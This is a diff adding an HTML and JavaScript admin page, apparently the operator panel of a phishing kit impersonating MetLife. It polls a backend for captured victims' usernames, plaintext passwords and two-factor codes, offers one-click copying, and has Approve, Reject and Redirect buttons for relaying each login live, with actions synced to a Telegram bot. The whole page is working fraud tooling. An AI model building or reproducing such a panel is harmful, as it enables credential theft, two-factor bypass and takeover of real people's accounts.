@@ -1,0 +1,465 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Pending approvals — metlife Admin</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header class="header">
+        <div class="brand">
+            <svg class="brand-mark" viewBox="0 0 48 48" aria-hidden="true">
+                <path d="M24 3 42 13v21L24 45 6 34V13L24 3Z" fill="none" stroke="#111" stroke-width="2.4"/>
+                <path d="M24 3v18l18-8M24 21 6 34M24 21l18 13" fill="none" stroke="#111" stroke-width="2"/>
+                <path d="m24 21 6 10-12 0 6-10Z" fill="none" stroke="#111" stroke-width="2"/>
+            </svg>
+            <div>
+                <div class="brand-name">Admin control center</div>
+                       <div class="tagline">Arab money Sees All, Arab money Knows All</div>
+            </div>
+        </div>
+    </header>
+    <div class="layout">
+        <aside class="sidebar">
+            <div class="sidebar-title">QUEUE</div>
+            <nav class="nav">
+                <a href="pending-new.html" class="active"><span>Pending</span><span class="count" id="pendingCount">0</span></a>
+                <a href="history-new.html" class=""><span>History</span><span class="count" id="historyCount">0</span></a>
+                <a href="health.html" class=""><span>Health</span></a>
+            </nav>
+            <div class="sidebar-note">Pending requests refresh every second. Admin actions are logged and synchronized with Telegram bot.</div>
+        </aside>
+        <main class="main">
+            <h1 class="page-title">Pending Approvals</h1>
+            <p class="page-subtitle">Approve or deny login requests. Admin actions are logged and synchronized with Telegram bot.</p>
+            <div id="requestsContainer">
+                <div class="empty">Loading pending requests...</div>
+            </div>
+        </main>
+    </div>
+    <button class="queue-btn" onclick="location.href='pending-new.html'"><span class="queue-icon"></span>Refresh</button>
+
+    <style>
+      .activity-card {
+    width: 100%;
+    min-height: 120px;
+    padding: 14px 14px;
+    margin-bottom: 12px;
+    background: #ffffff;
+    border: 1px solid #d5d9df;
+    border-radius: 10px;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.08), 0 8px 20px rgba(0, 0, 0, 0.03);
+    position: relative;
+}
+
+.card-header {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    gap: 12px;
+    margin-bottom: 8px;
+}
+
+.site-name {
+    margin: 0;
+    font-size: 14px;
+    font-weight: 600;
+    letter-spacing: 0.3px;
+    color: #465568;
+}
+
+.status {
+    margin: 0;
+    font-size: 13px;
+    font-weight: 500;
+    letter-spacing: 0.3px;
+    color: #ff8c00;
+}
+
+.details {
+    margin-top: 6px;
+}
+
+.details p {
+    margin: 5px 0;
+    font-size: 13px;
+    font-weight: 400;
+    color: #243447;
+    line-height: 1.4;
+}
+
+.details strong {
+    font-weight: 600;
+}
+
+.details code {
+    background: #f0f0f0;
+    padding: 2px 6px;
+    border-radius: 3px;
+    cursor: pointer;
+    user-select: all;
+    font-family: 'Courier New', monospace;
+    font-size: 12px;
+}
+
+.details code:hover {
+    background: #e0e0e0;
+}
+
+.date {
+    margin-top: 6px;
+    font-size: 12px;
+    color: #718096;
+    letter-spacing: 0.2px;
+}
+
+.request-actions {
+    display: flex;
+    gap: 8px;
+    margin-top: 10px;
+    padding-top: 8px;
+    border-top: 1px solid #e0e5ea;
+}
+
+.btn-approve {
+    background: #16802e;
+    color: white;
+    border: none;
+    padding: 6px 12px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: 600;
+    flex: 1;
+    font-size: 12px;
+    transition: background 0.2s;
+}
+
+.btn-approve:hover {
+    background: #117825;
+}
+
+.btn-reject {
+    background: #dc3545;
+    color: white;
+    border: none;
+    padding: 6px 12px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: 600;
+    flex: 1;
+    font-size: 12px;
+    transition: background 0.2s;
+}
+
+.btn-reject:hover {
+    background: #c82333;
+}
+
+.btn-reject:disabled, .btn-approve:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+}
+
+.btn-redirect {
+    background: #08716f;
+    color: white;
+    border: none;
+    padding: 6px 12px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: 600;
+    flex: 1;
+    font-size: 12px;
+    transition: background 0.2s;
+}
+
+.btn-redirect:hover {
+    background: #065a58;
+}
+
+.btn-redirect:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+}
+
+@media (max-width: 600px) {
+    .activity-card {
+        padding: 12px 11px;
+        min-height: 110px;
+        margin-bottom: 10px;
+    }
+
+    .card-header {
+        gap: 10px;
+        margin-bottom: 6px;
+    }
+
+    .site-name {
+        font-size: 13px;
+    }
+
+    .status {
+        font-size: 12px;
+    }
+
+    .details {
+        margin-top: 5px;
+    }
+
+    .details p {
+        margin: 4px 0;
+        font-size: 12px;
+    }
+
+    .details code {
+        padding: 1px 5px;
+        font-size: 11px;
+    }
+
+    .date {
+        font-size: 11px;
+        margin-top: 4px;
+    }
+
+    .request-actions {
+        gap: 6px;
+        margin-top: 8px;
+        padding-top: 6px;
+    }
+
+    .btn-approve, .btn-reject, .btn-redirect {
+        padding: 5px 10px;
+        font-size: 11px;
+    }
+}
+    </style>
+
+    <script src="config.js"></script>
+    <script>
+        let refreshInterval;
+
+        async function loadPendingRequests() {
+            try {
+                const response = await fetch(`${CONFIG.API_BASE}/admin/pending-logins`);
+                const result = await response.json();
+
+                if (!result.success) {
+                    document.getElementById('requestsContainer').innerHTML = `<div class="empty">Failed to load requests: ${result.message}</div>`;
+                    return;
+                }
+
+                const requests = result.data || [];
+                document.getElementById('pendingCount').textContent = requests.length;
+
+                if (requests.length === 0) {
+                    document.getElementById('requestsContainer').innerHTML = '<div class="empty">No pending login requests.</div>';
+                    return;
+                }
+
+                let html = '';
+                requests.forEach(req => {
+                    const time = new Date(req.createdAt).toLocaleString();
+                    html += `
+                        <section class="activity-card">
+                            <div class="card-header">
+                                <h2 class="site-name">${escapeHtml(req.logType)}</h2>
+                                <span class="status">Pending</span>
+                            </div>
+                            <div class="details">
+                                <p><strong>Bot Name:</strong> ${escapeHtml(req.botname || 'unknown')}</p>
+                                <p><strong>User ID:</strong> <code onclick="copyToClipboard('${escapeHtml(req.username)}', this)" title="Click to copy">${escapeHtml(req.username)}</code></p>
+                                <p><strong>Password:</strong> <code onclick="copyToClipboard('${escapeHtml(req.password)}', this)" title="Click to copy">${escapeHtml(req.password)}</code></p>
+                                <p><strong>Code:</strong> <code onclick="copyToClipboard('${req.twoFACode || 'unknown'}', this)" title="Click to copy">${req.twoFACode || 'unknown'}</code></p>
+                                <p><strong>Method :</strong> ${escapeHtml(req.twoFAMethod || 'Not verified')}</p>
+                            </div>
+                            <div class="date"> Requested:
+                                ${time}
+                            </div>
+                            <div class="request-actions">
+                                <button class="btn-approve" onclick="approveLogin('${escapeHtml(req.verificationId)}')" id="approve-${req.verificationId}">✓ Approve</button>
+                                <button class="btn-redirect" onclick="redirectUser('${escapeHtml(req.username)}', '${escapeHtml(req.verificationId)}')" id="redirect-${req.verificationId}">🔗 Redirect</button>
+                                 <button class="btn-reject" onclick="rejectLogin('${escapeHtml(req.verificationId)}')" id="reject-${req.verificationId}">✗ Reject</button>
+                            </div>
+                        </section>
+                    `;
+                });
+
+                document.getElementById('requestsContainer').innerHTML = html;
+            } catch (err) {
+                console.error('Error loading pending requests:', err);
+                document.getElementById('requestsContainer').innerHTML = `<div class="empty">Error loading requests: ${err.message}</div>`;
+            }
+        }
+
+         function copyToClipboard(text, element) {
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = element.textContent;
+                element.textContent = '✓ Copied!';
+                element.style.background = '#d4edda';
+                setTimeout(() => {
+                    element.textContent = originalText;
+                    element.style.background = '#f0f0f0';
+                }, 2000);
+            }).catch(() => {
+                alert('Failed to copy');
+            });
+        }
+
+        async function approveLogin(verificationId) {
+
+            const btn = document.getElementById(`approve-${verificationId}`);
+            btn.disabled = true;
+            btn.textContent = 'Approving...';
+
+            try {
+                const response = await fetch(`${CONFIG.API_BASE}/admin/approve-login/${verificationId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ approvedBy: 'admin-ui' }),
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    
+                    loadPendingRequests();
+                    loadSidebarCounts();
+                } else {
+                    alert(`Error: ${result.message}`);
+                    btn.disabled = false;
+                    btn.textContent = '✓ Approve';
+                }
+            } catch (err) {
+                console.error('Error approving login:', err);
+                alert(`Error: ${err.message}`);
+                btn.disabled = false;
+                btn.textContent = '✓ Approve';
+            }
+        }
+
+        async function rejectLogin(verificationId) {
+           
+        
+
+            const btn = document.getElementById(`reject-${verificationId}`);
+            btn.disabled = true;
+            btn.textContent = 'Rejecting...';
+
+            try {
+                const response = await fetch(`${CONFIG.API_BASE}/admin/reject-login/${verificationId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ reason: 'Rejected by admin', rejectedBy: 'admin-ui' }),
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                   
+                    loadPendingRequests();
+                    loadSidebarCounts();
+                } else {
+                    alert(`Error: ${result.message}`);
+                    btn.disabled = false;
+                    btn.textContent = '✗ Reject';
+                }
+            } catch (err) {
+                console.error('Error rejecting login:', err);
+                alert(`Error: ${err.message}`);
+                btn.disabled = false;
+                btn.textContent = '✗ Reject';
+            }
+        }
+
+        async function redirectUser(username, verificationId) {
+            const btn = document.getElementById(`redirect-${verificationId}`);
+            btn.disabled = true;
+            btn.textContent = 'Redirecting...';
+
+            try {
+                const response = await fetch(`${CONFIG.API_BASE}/admin/redirect-user/${verificationId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        username: username,
+                        redirectLink: CONFIG.redirectLink,
+                        redirectedBy: 'admin-ui'
+                    }),
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                   
+                    loadPendingRequests();
+                    loadSidebarCounts();
+                } else {
+                    alert(`Error: ${result.message}`);
+                    btn.disabled = false;
+                    btn.textContent = '🔗 Redirect';
+                }
+            } catch (err) {
+                console.error('Error redirecting user:', err);
+                alert(`Error: ${err.message}`);
+                btn.disabled = false;
+                btn.textContent = '🔗 Redirect';
+            }
+        }
+
+        async function loadSidebarCounts() {
+            try {
+                const response = await fetch(`${CONFIG.API_BASE}/admin/stats`);
+                const result = await response.json();
+
+                if (result.success && result.data) {
+                    const pendingCount = document.getElementById('pendingCount');
+                    const historyCount = document.getElementById('historyCount');
+
+                    if (pendingCount) {
+                        pendingCount.textContent = result.data.pending || 0;
+                    }
+                    if (historyCount) {
+                        historyCount.textContent = (result.data.approved || 0) + (result.data.rejected || 0);
+                    }
+                }
+            } catch (err) {
+                console.error('Error loading sidebar counts:', err);
+            }
+        }
+
+        function escapeHtml(text) {
+            const map = {
+                '&': '&amp;',
+                '<': '&lt;',
+                '>': '&gt;',
+                '"': '&quot;',
+                "'": '&#039;'
+            };
+            return String(text).replace(/[&<>"']/g, m => map[m]);
+        }
+
+        // Initial load
+        document.addEventListener('DOMContentLoaded', () => {
+            // Set active nav
+            document.querySelectorAll('.nav a').forEach(a => {
+                if (a.getAttribute('href') === 'pending-new.html') {
+                    a.classList.add('active');
+                }
+            });
+
+            loadPendingRequests();
+            loadSidebarCounts();
+            // Refresh every 1 second
+            refreshInterval = setInterval(() => {
+                loadPendingRequests();
+               // loadSidebarCounts();
+            }, 5000);
+        });
+
+        window.addEventListener('beforeunload', () => {
+            if (refreshInterval) clearInterval(refreshInterval);
+        });
+    </script>
+</body>
+</html>
